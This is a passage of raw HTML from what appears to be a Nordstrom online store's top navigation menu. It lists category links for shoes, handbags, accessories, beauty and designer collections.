				<li class="nav-entry-all-mens-shoes"><a href="http://shop.nordstrom.com/c/mens-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_All Men&#39;s Shoes">All Men&#39;s Shoes</a></li>
				<li class="nav-entry-athletic"><a href="http://shop.nordstrom.com/c/mens-athletic-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Athletic">Athletic</a></li>
				<li class="nav-entry-boots"><a href="http://shop.nordstrom.com/c/men-boots?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Boots">Boots</a></li>
				<li class="nav-entry-dress-shoes"><a href="http://shop.nordstrom.com/c/mens-dress-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Dress Shoes">Dress Shoes</a></li>
				<li class="nav-entry-loafers-slip-ons"><a href="http://shop.nordstrom.com/c/mens-loafers-slip-ons?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Loafers &amp; Slip-Ons">Loafers &amp; Slip-Ons</a></li>
				<li class="nav-entry-boat-shoes"><a href="http://shop.nordstrom.com/c/mens-boat-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Boat Shoes">Boat Shoes</a></li>
				<li class="nav-entry-oxfords"><a href="http://shop.nordstrom.com/c/mens-oxfords?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Oxfords">Oxfords</a></li>
				<li class="nav-entry-sandals-flip-flops"><a href="http://shop.nordstrom.com/c/mens-sandals?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Sandals &amp; Flip-Flops">Sandals &amp; Flip-Flops</a></li>
				<li class="nav-entry-slippers"><a href="http://shop.nordstrom.com/c/mens-slippers?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Slippers">Slippers</a></li>
				<li class="nav-entry-sneakers"><a href="http://shop.nordstrom.com/c/mens-sneakers?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Sneakers">Sneakers</a></li>
				<li class="nav-entry-extended-sizes"><a href="http://shop.nordstrom.com/c/mens-special-size-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Extended Sizes">Extended Sizes</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-designer-shoes"><a href="http://shop.nordstrom.com/c/mens-designer-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Designer Shoes">Designer Shoes</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/sale-mens-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men_Sale">Sale</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-juniors"><a href="http://shop.nordstrom.com/c/juniors-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Juniors">Juniors</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-kids"><a href="http://shop.nordstrom.com/c/kids-shoes?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids">Kids</a></h3>
			<ul>
				<li class="nav-entry-girls-shoes"><a href="http://shop.nordstrom.com/c/girls-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Girls&#39; Shoes">Girls&#39; Shoes</a></li>
				<li class="nav-entry-athletic"><a href="http://shop.nordstrom.com/c/girls-athletic-shoes?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Athletic">Athletic</a></li>
				<li class="nav-entry-boots-booties"><a href="http://shop.nordstrom.com/c/girls-boots-booties??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Boots &amp; Booties">Boots &amp; Booties</a></li>
				<li class="nav-entry-dress/occasion"><a href="http://shop.nordstrom.com/c/girls-dress-occasion-shoes??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Dress/Occasion">Dress/Occasion</a></li>
				<li class="nav-entry-flats"><a href="http://shop.nordstrom.com/c/girls-flat-shoes??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Flats">Flats</a></li>
				<li class="nav-entry-sneakers"><a href="http://shop.nordstrom.com/c/girls-sneakers??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Sneakers">Sneakers</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-boys-shoes"><a href="http://shop.nordstrom.com/c/boys-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Boys&#39; Shoes">Boys&#39; Shoes</a></li>
				<li class="nav-entry-athletic"><a href="http://shop.nordstrom.com/c/boys-athletic-shoes??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Athletic">Athletic</a></li>
				<li class="nav-entry-boots"><a href="http://shop.nordstrom.com/c/boys-boots??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Boots">Boots</a></li>
				<li class="nav-entry-casual"><a href="http://shop.nordstrom.com/c/boys-casual-shoes??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Casual">Casual</a></li>
				<li class="nav-entry-dress"><a href="http://shop.nordstrom.com/c/boys-dress-shoes??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Dress">Dress</a></li>
				<li class="nav-entry-sneakers"><a href="http://shop.nordstrom.com/c/boys-sneakers??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Sneakers">Sneakers</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-baby-walker-shoes"><a href="http://shop.nordstrom.com/c/baby-walker-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Baby &amp; Walker Shoes">Baby &amp; Walker Shoes</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/baby-kids-shoes-sale?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Kids_Sale">Sale</a></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-handbags" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="handbags-tab" href="http://shop.nordstrom.com/c/handbags-shop?dept=8000001&amp;origin=topnav" title="Handbags" aria-controls="handbags-panel" manual_cm_sp="Top Navigation-_-Handbags-_-Handbags">
							<span>Handbags</span>
						</a>
					</h2>
					<div id="handbags-panel" aria-labelledby="handbags-tab" class="nav-category nav-column-1">
							<div class="nav-category-column">
												<h3 class="nav-entry-women"><a href="http://shop.nordstrom.com/c/handbags-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women">Women</a></h3>
			<ul>
				<li class="nav-entry-all-handbags-wallets"><a href="http://shop.nordstrom.com/c/womens-handbags-and-wallets?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_All Handbags &amp; Wallets">All Handbags &amp; Wallets</a></li>
				<li class="nav-entry-backpacks"><a href="http://shop.nordstrom.com/c/womens-backpacks?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Backpacks">Backpacks</a></li>
				<li class="nav-entry-bucket-bags"><a href="http://shop.nordstrom.com/c/bucket-bags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Bucket Bags">Bucket Bags</a></li>
				<li class="nav-entry-clutches-evening-bags"><a href="http://shop.nordstrom.com/c/clutches-evening-bags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Clutches &amp; Evening Bags">Clutches &amp; Evening Bags</a></li>
				<li class="nav-entry-crossbody-bags"><a href="http://shop.nordstrom.com/c/crossbody-bags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Crossbody Bags">Crossbody Bags</a></li>
				<li class="nav-entry-diaper-bags"><a href="http://shop.nordstrom.com/c/diaper-bag?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Diaper Bags">Diaper Bags</a></li>
				<li class="nav-entry-satchels"><a href="http://shop.nordstrom.com/c/satchel?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Satchels">Satchels</a></li>
				<li class="nav-entry-shoulder-bags-hobos"><a href="http://shop.nordstrom.com/c/shoulder-bags-and-hobos?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Shoulder Bags &amp; Hobos">Shoulder Bags &amp; Hobos</a></li>
				<li class="nav-entry-totes"><a href="http://shop.nordstrom.com/c/tote-bags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Totes">Totes</a></li>
				<li class="nav-entry-wallets"><a href="http://shop.nordstrom.com/c/wallets-for-women?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Wallets">Wallets</a></li>
				<li class="nav-entry-wristlets"><a href="http://shop.nordstrom.com/c/wristlets?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Wristlets">Wristlets</a></li>
				<li class="nav-entry-cosmetic-cases-pouches"><a href="http://shop.nordstrom.com/c/cosmetic-cases-and-pouches?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Cosmetic Cases &amp; Pouches">Cosmetic Cases &amp; Pouches</a></li>
				<li class="nav-entry-luggage-travel"><a href="http://shop.nordstrom.com/c/luggage-travel?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Luggage &amp; Travel">Luggage &amp; Travel</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-designer-handbags"><a href="http://shop.nordstrom.com/c/designer-handbags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Designer Handbags">Designer Handbags</a></li>
				<li class="nav-entry-contemporary-handbags"><a href="http://shop.nordstrom.com/c/womens-contemporary-handbags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Contemporary Handbags">Contemporary Handbags</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/sale-womens-wallets?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Handbags-_-Women_Sale">Sale</a></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-accessories" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="accessories-tab" href="http://shop.nordstrom.com/c/accessories?dept=8000001&amp;origin=topnav" title="Accessories" aria-controls="accessories-panel" manual_cm_sp="Top Navigation-_-Accessories-_-Accessories">
							<span>Accessories</span>
						</a>
					</h2>
					<div id="accessories-panel" aria-labelledby="accessories-tab" class="nav-category nav-column-3">
							<div class="nav-category-column">
												<h3 class="nav-entry-women"><a href="http://shop.nordstrom.com/c/handbags-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women">Women</a></h3>
			<ul>
				<li class="nav-entry-handbags-wallets"><a href="http://shop.nordstrom.com/c/handbags-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Handbags &amp; Wallets">Handbags &amp; Wallets</a></li>
				<li class="nav-entry-watches"><a href="http://shop.nordstrom.com/c/womens-watches-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Watches">Watches</a></li>
				<li class="nav-entry-jewelry"><a href="http://shop.nordstrom.com/c/jewelry?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Jewelry">Jewelry</a></li>
				<li class="nav-entry-fine-jewelry"><a href="http://shop.nordstrom.com/c/fine-jewelry-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Fine Jewelry">Fine Jewelry</a></li>
				<li class="nav-entry-sunglasses-eyewear"><a href="http://shop.nordstrom.com/c/womens-sunglasses-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Sunglasses &amp; Eyewear">Sunglasses &amp; Eyewear</a></li>
				<li class="nav-entry-scarves-wraps"><a href="http://shop.nordstrom.com/c/scarves-wraps?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Scarves &amp; Wraps">Scarves &amp; Wraps</a></li>
				<li class="nav-entry-hats-hair-accessories"><a href="http://shop.nordstrom.com/c/womens-hats-hair-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Hats &amp; Hair Accessories">Hats &amp; Hair Accessories</a></li>
				<li class="nav-entry-winter-accessories"><a href="http://shop.nordstrom.com/c/winter-accessories-womens?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Winter Accessories">Winter Accessories</a></li>
				<li class="nav-entry-gloves"><a href="http://shop.nordstrom.com/c/womens-gloves?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Gloves">Gloves</a></li>
				<li class="nav-entry-belts"><a href="http://shop.nordstrom.com/c/womens-accessories-belts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Belts">Belts</a></li>
				<li class="nav-entry-luggage-travel"><a href="http://shop.nordstrom.com/c/luggage-travel?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Luggage &amp; Travel">Luggage &amp; Travel</a></li>
				<li class="nav-entry-tech-accessories-cases"><a href="http://shop.nordstrom.com/c/tech-phone-cases?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Tech Accessories &amp; Cases">Tech Accessories &amp; Cases</a></li>
				<li class="nav-entry-hosiery-socks"><a href="http://shop.nordstrom.com/c/womens-hosiery-leggings-socks?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Hosiery &amp; Socks">Hosiery &amp; Socks</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/sale-handbags-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Women_Sale">Sale</a></li>
					<li class="spacer-hack"></li>
		</ul>
					<h3 class="nav-entry-featured-brands">Featured Brands</h3>
			<ul>
				<li class="nav-entry-david-yurman"><a href="http://shop.nordstrom.com/c/david-yurman?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Featured Brands_David Yurman">David Yurman</a></li>
				<li class="nav-entry-kate-spade-new-york"><a href="http://shop.nordstrom.com/c/kate-spade-new-york-womens-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Featured Brands_kate spade new york">kate spade new york</a></li>
				<li class="nav-entry-tory-burch"><a href="http://shop.nordstrom.com/c/tory-burch-accessories-women?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Featured Brands_Tory Burch">Tory Burch</a></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-men"><a href="http://shop.nordstrom.com/c/mens-accessories-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men">Men</a></h3>
			<ul>
				<li class="nav-entry-bags-wallets"><a href="http://shop.nordstrom.com/c/mens-bags-cases?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Bags &amp; Wallets">Bags &amp; Wallets</a></li>
				<li class="nav-entry-belts-suspenders"><a href="http://shop.nordstrom.com/c/mens-belts-suspenders?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Belts &amp; Suspenders">Belts &amp; Suspenders</a></li>
				<li class="nav-entry-watches"><a href="http://shop.nordstrom.com/c/mens-watches?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Watches">Watches</a></li>
				<li class="nav-entry-ties-pocket-squares"><a href="http://shop.nordstrom.com/c/mens-ties?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Ties &amp; Pocket Squares">Ties &amp; Pocket Squares</a></li>
				<li class="nav-entry-sunglasses"><a href="http://shop.nordstrom.com/c/mens-sunglasses?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Sunglasses">Sunglasses</a></li>
				<li class="nav-entry-audio,-tech-home"><a href="http://shop.nordstrom.com/c/mens-tech-accessories-gadgets?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Audio, Tech &amp; Home">Audio, Tech &amp; Home</a></li>
				<li class="nav-entry-scarves,-hats-gloves"><a href="http://shop.nordstrom.com/c/mens-hats-gloves-scarves?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Scarves, Hats &amp; Gloves">Scarves, Hats &amp; Gloves</a></li>
				<li class="nav-entry-jewelry-cuff-links"><a href="http://shop.nordstrom.com/c/mens-cuff-links-jewelry?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Jewelry &amp; Cuff Links">Jewelry &amp; Cuff Links</a></li>
				<li class="nav-entry-luggage-travel"><a href="http://shop.nordstrom.com/c/mens-luggage?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Men_Luggage &amp; Travel">Luggage &amp; Travel</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-juniors"><a href="http://shop.nordstrom.com/c/juniors-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Juniors">Juniors</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-kids"><a href="http://shop.nordstrom.com/c/kids-bags-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Kids">Kids</a></h3>
			<ul>
				<li class="nav-entry-girls-accessories"><a href="http://shop.nordstrom.com/c/girls-handbags-accessories-all?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Kids_Girls&#39; Accessories">Girls&#39; Accessories</a></li>
				<li class="nav-entry-boys-accessories"><a href="http://shop.nordstrom.com/c/boys-bags-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Kids_Boys&#39; Accessories">Boys&#39; Accessories</a></li>
				<li class="nav-entry-baby-girl-accessories"><a href="http://shop.nordstrom.com/c/all-baby-girl-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Kids_Baby Girl Accessories">Baby Girl Accessories</a></li>
				<li class="nav-entry-baby-boy-accessories"><a href="http://shop.nordstrom.com/c/all-baby-boy-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Kids_Baby Boy Accessories">Baby Boy Accessories</a></li>
				<li class="nav-entry-baby-gear"><a href="http://shop.nordstrom.com/c/baby-gear?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Accessories-_-Kids_Baby Gear">Baby Gear</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-beauty" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="beauty-tab" href="http://shop.nordstrom.com/c/beauty-makeup-perfume?dept=8000001&amp;origin=topnav" title="Beauty" aria-controls="beauty-panel" manual_cm_sp="Top Navigation-_-Beauty-_-Beauty">
							<span>Beauty</span>
						</a>
					</h2>
					<div id="beauty-panel" aria-labelledby="beauty-tab" class="nav-category nav-column-2">
							<div class="nav-category-column">
												<h3 class="nav-entry-women"><a href="http://shop.nordstrom.com/c/beauty-makeup-perfume?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women">Women</a></h3>
			<ul>
				<li class="nav-entry-makeup"><a href="http://shop.nordstrom.com/c/makeup-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Makeup">Makeup</a></li>
				<li class="nav-entry-skincare"><a href="http://shop.nordstrom.com/c/skincare-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Skincare">Skincare</a></li>
				<li class="nav-entry-fragrance"><a href="http://shop.nordstrom.com/c/womens-fragrances?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Fragrance">Fragrance</a></li>
				<li class="nav-entry-hair-care"><a href="http://shop.nordstrom.com/c/beauty-hair-care?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Hair Care">Hair Care</a></li>
				<li class="nav-entry-bath-body"><a href="http://shop.nordstrom.com/c/beauty-skincare-bath-body?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Bath &amp; Body">Bath &amp; Body</a></li>
				<li class="nav-entry-nails"><a href="http://shop.nordstrom.com/c/beauty-makeup-nails?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Nails">Nails</a></li>
				<li class="nav-entry-tools-brushes"><a href="http://shop.nordstrom.com/c/tools-brushes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Tools &amp; Brushes">Tools &amp; Brushes</a></li>
				<li class="nav-entry-gifts-value-sets"><a href="http://shop.nordstrom.com/c/beauty-gifts-value-sets-all?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Gifts &amp; Value Sets">Gifts &amp; Value Sets</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-womens-beauty-brands"><a href="http://shop.nordstrom.com/c/womens-brands/beautyfragrance?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Beauty-_-Women_Women&#39;s Beauty Brands">Women&#39;s Beauty Brands</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-juniors"><a href="http://shop.nordstrom.com/c/juniors-makeup-skincare?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Juniors">Juniors</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-mens-grooming-cologne"><a href="http://shop.nordstrom.com/c/mens-grooming-cologne?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Men&#39;s Grooming &amp; Cologne">Men&#39;s Grooming &amp; Cologne</a></h3>
			<ul>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
			<ul>
				<li class="nav-entry-gifts-with-purchase"><a href="http://shop.nordstrom.com/c/beauty-gifts-with-purchase?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Beauty_Gifts with Purchase">Gifts with Purchase</a></li>
				<li class="nav-entry-3-free-samples-with-purchase"><a href="http://shop.nordstrom.com/c/choose-three-free-samples?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Beauty_3 Free Samples with Purchase">3 Free Samples with Purchase</a></li>
				<li class="nav-entry-beauty-blog"><a href="http://blogs.nordstrom.com/beauty/?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Beauty-_-Beauty_Beauty Blog">Beauty Blog</a></li>
				<li class="nav-entry-new-arrivals"><a href="http://shop.nordstrom.com/c/beauty-new?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Beauty_New Arrivals">New Arrivals</a></li>
				<li class="nav-entry-beauty-concierge"><a href="http://shop.nordstrom.com/c/beauty-concierge?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Beauty_Beauty Concierge">Beauty Concierge</a></li>
					<li class="spacer-hack"></li>
			</ul>
					<h3 class="stylewatch nav-entry-style-watch">Style Watch</h3>
			<ul>
				<li class="nav-entry-party-makeup:-sparkling-accents"><a href="http://shop.nordstrom.com/c/sparkling-accents?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Beauty-_-Style Watch_Party Makeup: Sparkling Accents">Party Makeup: Sparkling Accents</a></li>
				<li class="nav-entry-beauty-values:-save-up-to-40%"><a href="http://shop.nordstrom.com/c/beauty-best-buys?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Beauty-_-Style Watch_Beauty Values: Save up to 40%">Beauty Values: Save up to 40%</a></li>
				<li class="nav-entry-now-online:-hourglass"><a href="http://shop.nordstrom.com/c/hourglass?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Beauty-_-Style Watch_Now Online: Hourglass">Now Online: Hourglass</a></li>
				<li class="nav-entry-what’s-hot:-masks"><a href="http://shop.nordstrom.com/c/face-mask?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Beauty-_-Style Watch_What’s Hot: Masks">What’s Hot: Masks</a></li>
				<li class="nav-entry-only-at-nordstrom:-nars-eye-opening-act"><a href="http://shop.nordstrom.com/c/womens-nars?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Style Watch_Only at Nordstrom: NARS Eye Opening Act">Only at Nordstrom: NARS Eye Opening Act</a></li>
				<li class="nav-entry-brand-we-love:-kiehls"><a href="http://shop.nordstrom.com/c/all-kiehls?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Beauty-_-Style Watch_Brand We Love: Kiehl&#39;s">Brand We Love: Kiehl&#39;s</a></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-designers" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="designers-tab" href="http://shop.nordstrom.com/c/brands-list?dept=8000001&amp;origin=topnav" title="Designers" aria-controls="designers-panel" manual_cm_sp="Top Navigation-_-Designers-_-Designers">
							<span>Designers</span>
						</a>
					</h2>
					<div id="designers-panel" aria-labelledby="designers-tab" class="nav-category nav-column-3">
	<div class="designer-collections clearfix">
			<div class="nav-category-column">


				<ul>
		</ul>
			<h3 class="nav-entry-womens-designer"><a href="http://shop.nordstrom.com/c/designer-collections?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Women&#39;s Designer">Women&#39;s Designer</a></h3>
		<ul>

				<li class="nav-entry-clothing"><a href="http://shop.nordstrom.com/c/designer-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Women&#39;s Designer_Clothing">Clothing</a></li>
				<li class="nav-entry-dresses"><a href="http://shop.nordstrom.com/c/designer-dresses?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Women&#39;s Designer_Dresses">Dresses</a></li>
				<li class="nav-entry-tops"><a href="http://shop.nordstrom.com/c/designer-tops?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Women&#39;s Designer_Tops">Tops</a></li>
				<li class="nav-entry-sweaters"><a href="http://shop.nordstrom.com/c/designer-sweaters?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Women&#39;s Designer_Sweaters">Sweaters</a></li>
				<li class="nav-entry-coats"><a href="http://shop.nordstrom.com/c/designer-womens-coats?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Women&#39;s Designer_Coats">Coats</a></li>
				<li class="nav-entry-pants"><a href="http://shop.nordstrom.com/c/designer-pants-shorts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Women&#39;s Designer_Pants">Pants</a></li>
				</ul>
			</div>
			<div class="nav-category-column">


				<ul>
				<li class="nav-entry-shoes"><a href="http://shop.nordstrom.com/c/designer-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Shoes">Shoes</a></li>

				<li class="nav-entry-handbags"><a href="http://shop.nordstrom.com/c/designer-handbags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Shoes_Handbags">Handbags</a></li>
				<li class="nav-entry-jewelry-accessories"><a href="http://shop.nordstrom.com/c/designer-collections-jewelry-and-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Shoes_Jewelry &amp; Accessories">Jewelry &amp; Accessories</a></li>
				<li class="nav-entry-new-arrivals"><a href="http://shop.nordstrom.com/c/designer-new?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Shoes_New Arrivals">New Arrivals</a></li>
